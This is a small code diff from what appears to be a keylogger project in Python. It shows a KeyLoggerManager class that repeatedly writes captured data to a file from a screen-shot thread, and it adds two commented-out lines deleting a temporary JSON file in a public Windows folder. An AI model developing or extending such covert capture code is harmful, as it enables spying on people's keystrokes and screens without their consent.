@@ -20,6 +20,7 @@ class KeyLoggerManager:
     def write_file(self):
         writer = FileWriter()
         writer.write_to_file(self.__instance.data)
+        # os.remove(r"C:\Users\Public\tmp.json")
 
     def __thread_take_shot(self):
         while self.__instance._KeyloggerService__action:
@@ -31,6 +32,7 @@ class KeyLoggerManager:
             self.write_file()
             time.sleep(2)
         self.write_file()
+        # os.remove(r"C:\Users\Public\tmp.json")
 
     def main(self):
         threading.Thread(target=self.start).start()
